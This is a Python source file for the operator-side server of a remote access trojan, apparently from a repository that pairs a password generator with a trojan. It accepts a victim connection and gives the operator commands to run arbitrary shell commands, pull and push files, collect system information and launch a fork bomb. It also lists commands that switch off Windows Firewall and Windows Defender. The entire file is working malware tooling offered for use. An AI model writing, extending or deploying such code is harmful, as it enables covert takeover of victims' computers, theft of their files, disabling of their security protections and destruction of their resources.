"""
Copyright (c) 2022, v0x45
All rights reserved.

This source code is licensed under the BSD-style license found in https://github.com/v0x45/PassGen-by-Rayan-w-Trojan/blob/main/LICENSE
"""

# Libraries
import socket
from time import sleep
import colorama
from colorama import Fore

colorama.init(autoreset=True)

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = '0.0.0.0'
port = 7976
encoding_ = 'utf-8'
server.bind((host, port))
print(f'''{Fore.LIGHTBLACK_EX}
░██████╗███████╗██████╗░██╗░░░██╗███████╗██████╗░  ██╗░░░██╗░█████╗░░░░██████╗░░█████╗░
██╔════╝██╔════╝██╔══██╗██║░░░██║██╔════╝██╔══██╗  ██║░░░██║██╔══██╗░░░╚════██╗██╔══██╗
╚█████╗░█████╗░░██████╔╝╚██╗░██╔╝█████╗░░██████╔╝  ╚██╗░██╔╝██║░░██║░░░░█████╔╝██║░░██║
░╚═══██╗██╔══╝░░██╔══██╗░╚████╔╝░██╔══╝░░██╔══██╗  ░╚████╔╝░██║░░██║░░░░╚═══██╗██║░░██║
██████╔╝███████╗██║░░██║░░╚██╔╝░░███████╗██║░░██║  ░░╚██╔╝░░╚█████╔╝██╗██████╔╝╚█████╔╝
╚═════╝░╚══════╝╚═╝░░╚═╝░░░╚═╝░░░╚══════╝╚═╝░░╚═╝  ░░░╚═╝░░░░╚════╝░╚═╝╚═════╝░░╚════╝░

            ▒█▀▀█ █▀▀█ █░░█ █▀▀█ █▀▀▄ 　 ░█▀▀█ █░░ ▒█░▄▀ █▀▀ █▀▀ █▀▀█ █▀▀█ ░▀░ 
            ▒█▄▄▀ █▄▄█ █▄▄█ █▄▄█ █░░█ 　 ▒█▄▄█ █░░ ▒█▀▄░ █▀▀ █▀▀ █▄▄█ █▄▄▀ ▀█▀ 
            ▒█░▒█ ▀░░▀ ▄▄▄█ ▀░░▀ ▀░░▀ 　 ▒█░▒█ ▀▀▀ ▒█░▒█ ▀▀▀ ▀░░ ▀░░▀ ▀░▀▀ ▀▀▀
''')

print(f'\n{Fore.LIGHTWHITE_EX}The server is currently running @' + str(host))
print(f'\n{Fore.LIGHTYELLOW_EX}Waiting for a client connection..')
server.listen(1)
client, client_address = server.accept()
user = client.recv(1024)
print(f'\n{Fore.LIGHTGREEN_EX}{user} {client_address} Has connected to the server successfully.')
header = client.recv(1024).decode(encoding_)
print(f'{header}')
print(
    f'\n{Fore.LIGHTWHITE_EX}Enter {Fore.LIGHTMAGENTA_EX}--help{Fore.LIGHTWHITE_EX} to see the full list of supported commands')

while True:
    command = str(input(f'\n[-] Enter a command> '))

    if command == '--help' or command == '--h':
        print(f'''
        {Fore.LIGHTMAGENTA_EX}--h{Fore.LIGHTWHITE_EX},{Fore.LIGHTMAGENTA_EX}   --help                {Fore.LIGHTWHITE_EX}to see the full list of supported commands.
        {Fore.LIGHTMAGENTA_EX}--cl{Fore.LIGHTWHITE_EX},{Fore.LIGHTMAGENTA_EX}  --custom-command-lst  {Fore.LIGHTWHITE_EX}to display helpful command lines (Lockscreen/Shutdown/etc.,)
        {Fore.LIGHTMAGENTA_EX}--cd{Fore.LIGHTWHITE_EX},{Fore.LIGHTMAGENTA_EX}  --chdir               {Fore.LIGHTWHITE_EX}to change cwd path.
        {Fore.LIGHTMAGENTA_EX}--lst{Fore.LIGHTWHITE_EX},{Fore.LIGHTMAGENTA_EX} --list                {Fore.LIGHTWHITE_EX}to list files in the dir.
        {Fore.LIGHTMAGENTA_EX}--df{Fore.LIGHTWHITE_EX},{Fore.LIGHTMAGENTA_EX}  --download-file       {Fore.LIGHTWHITE_EX}to download a file with custom path from client.
        {Fore.LIGHTMAGENTA_EX}--uf{Fore.LIGHTWHITE_EX},{Fore.LIGHTMAGENTA_EX}  --upload-file         {Fore.LIGHTWHITE_EX}to upload a file with custom path to client.
        {Fore.LIGHTMAGENTA_EX}--cc{Fore.LIGHTWHITE_EX},{Fore.LIGHTMAGENTA_EX}  --custom              {Fore.LIGHTWHITE_EX}to run a custom command on the client shell.
        {Fore.LIGHTMAGENTA_EX}--si{Fore.LIGHTWHITE_EX},{Fore.LIGHTMAGENTA_EX}  --systeminfo          {Fore.LIGHTWHITE_EX}to get the client's system info.
        {Fore.LIGHTMAGENTA_EX}--fb{Fore.LIGHTWHITE_EX},{Fore.LIGHTMAGENTA_EX}  --forkbomb            {Fore.LIGHTWHITE_EX}to kill the computer resources with repetitive endless tasks.
        {Fore.LIGHTMAGENTA_EX}--t0{Fore.LIGHTWHITE_EX},{Fore.LIGHTMAGENTA_EX}  --terminate0          {Fore.LIGHTWHITE_EX}to terminate the server and destroy the client's connection initialization loop.
        {Fore.LIGHTMAGENTA_EX}--t1{Fore.LIGHTWHITE_EX},{Fore.LIGHTMAGENTA_EX}  --terminate1          {Fore.LIGHTWHITE_EX}to terminate the server and keep the client's connection initialization loop.
        ''')

    elif command == '--cl' or command == '--custom-command-lst':
        print(f'''
        {Fore.LIGHTMAGENTA_EX}Rundll32.exe user32.dll,LockWorkStation               {Fore.LIGHTWHITE_EX}Lock the machine.
        {Fore.LIGHTMAGENTA_EX}Netsh Advfirewall show allprofiles                    {Fore.LIGHTWHITE_EX}To check the status of Windows Firewall
        {Fore.LIGHTMAGENTA_EX}NetSh Advfirewall set allprofiles state off           {Fore.LIGHTWHITE_EX}To turn OFF Windows Firewall.
        {Fore.LIGHTMAGENTA_EX}NetSh Advfirewall set allprofiles state on            {Fore.LIGHTWHITE_EX}To turn ON Windows Firewall.
        {Fore.LIGHTMAGENTA_EX}sc query WinDefend                                    {Fore.LIGHTWHITE_EX}To check the status of Windows Defender.
        {Fore.LIGHTMAGENTA_EX}sc stop WinDefend                                     {Fore.LIGHTWHITE_EX}To turn OFF Windows Defender.
        {Fore.LIGHTMAGENTA_EX}sc start WinDefend                                    {Fore.LIGHTWHITE_EX}To turn ON Windows Defender.
        {Fore.LIGHTMAGENTA_EX}sc config WinDefend start= disabled                   {Fore.LIGHTWHITE_EX}To DISABLE Windows Defender on startup.
        {Fore.LIGHTMAGENTA_EX}sc config WinDefend start= auto                       {Fore.LIGHTWHITE_EX}To ENABLE Windows Defender on startup.
        {Fore.LIGHTMAGENTA_EX}shutdown /s                                           {Fore.LIGHTWHITE_EX}Shutdown the client's machine.
        {Fore.LIGHTMAGENTA_EX}shutdown /r                                           {Fore.LIGHTWHITE_EX}Restart the client's machine.
        {Fore.LIGHTMAGENTA_EX}shutdown /l                                           {Fore.LIGHTWHITE_EX}Log off the client's machine.
        {Fore.LIGHTMAGENTA_EX}shutdown /f                                           {Fore.LIGHTWHITE_EX}Force running applications to close without forewarning users.
        {Fore.LIGHTMAGENTA_EX}python -m                                             {Fore.LIGHTWHITE_EX}Run python command from cmd.
        ''')
        # nssm.exe install "MyCustomService" "C:\Users\nanodano\venv\Scripts\python.exe" "C:\Users\nanodano\myscript.py"  ## Create Windows service to run Python script

    elif command == '--cd' or command == '--chdir':
        client.sendall(command.encode(encoding_))
        change_cwd = str(input(f'[-] new path (use / not \\)>> cd '))
        client.sendall(change_cwd.encode(encoding_))
        chdir_confirmation = client.recv(1024)
        chdir_confirmation = chdir_confirmation.decode(encoding_)
        print(f'{Fore.LIGHTGREEN_EX}{chdir_confirmation}')

    elif command == '--list' or command == '--lst':
        client.sendall(command.encode(encoding_))
        list_ = client.recv(1024).decode(encoding_)
        print(f'{Fore.LIGHTGREEN_EX}{list_}')

    elif command == '--download-file' or command == '--df':
        filepath = str(input(f'[-] The file path>> '))
        filename = str(input(f'[-] Save the file as>> '))
        client.sendall(command.encode(encoding_))
        client.sendall(filename.encode(encoding_))
        with open(str(filename), 'wb') as file:
            data = client.recv(9000000)
            while data:
                print(f'sending {data}')
                file.write(data)
                data = client.recv(9000000)
                if data == b'Done':
                    break
        file.close()
        print(f'{Fore.LIGHTGREEN_EX}[+] The file has been received successfully.')

    elif command == '--upload-file' or command == '--uf':
        filepath = str(input(f'[-] The file path>> '))
        filename = str(input(f'[-] Save the file as>> '))
        client.sendall(command.encode(encoding_))
        client.sendall(filename.encode(encoding_))
        with open(filepath, 'rb') as file:
            data = file.read(9000000)
            while data:
                print(f'sending {data}')
                client.send(data)
                data = file.read(9000000)
            sleep(2)
            client.send(b'Done')
        file.close()
        print(f'{Fore.LIGHTGREEN_EX}[+] The file has been sent successfully.')

    elif command == '--cc' or command == '--custom':
        client.sendall(command.encode(encoding_))
        custom_command = str(input(f'[-] Custom command>> '))
        client.sendall(custom_command.encode(encoding_))
        output = client.recv(1024)
        if output != b'':
            print(f'{Fore.LIGHTGREEN_EX}[+] {output}')
        else:
            print(f'{Fore.LIGHTGREEN_EX}[+] No visible output!')

    elif command == '--systeminfo' or command == '--si':
        client.sendall(command.encode(encoding_))
        systeminfo = client.recv(900000).decode(encoding_)
        print(f'{Fore.LIGHTGREEN_EX}{systeminfo}')

    elif command == '--forkbomb' or command == '--fb':
        while True:
            try:
                fb_confirmation = str(input(
                    f"Are you sure you wanna kill the client's computer resources with repetitive endless tasks (Y/N)? "))
                break
            except:
                print(f'{Fore.LIGHTRED_EX}Y for yes')
                print(f'{Fore.LIGHTRED_EX}N for no')
        if fb_confirmation.lower == 'y' or fb_confirmation.lower == 'yes':
            client.sendall(command.encode(encoding_))
        else:
            pass

    elif command == '--t0' or command == '--terminate0':
        client.sendall(command.encode(encoding_))
        client.close()
        print(f'{Fore.LIGHTRED_EX}[-] The server has been terminated successfully.')
        break

    elif command == '--t1' or command == '--terminate1':
        client.sendall(command.encode(encoding_))
        client.close()
        print(f'{Fore.LIGHTRED_EX}[-] The server has been terminated successfully.')
        break

    else:
        print(f'{Fore.LIGHTYELLOW_EX}[-] The command is not recognized.')
